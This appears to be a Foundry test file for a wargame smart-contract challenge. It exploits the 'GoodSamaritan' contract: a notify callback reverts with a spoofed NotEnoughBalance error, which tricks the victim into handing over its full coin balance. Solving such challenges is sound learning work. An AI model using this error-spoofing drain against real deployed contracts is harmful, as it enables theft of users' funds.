// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {GoodSamaritan} from "../src/GoodSamaritan.sol";

contract CounterTest is Test {
    GoodSamaritan victim;
    error NotEnoughBalance();

    function setUp() public {
        victim = new GoodSamaritan();
    }

    function test_DrainWallet() public {
        victim.requestDonation();
        assertTrue(victim.coin().balances(address(this)) == 10 ** 6);
    }

    function notify(uint256 amount) external {
        if (amount == 10) revert NotEnoughBalance();
    }
}
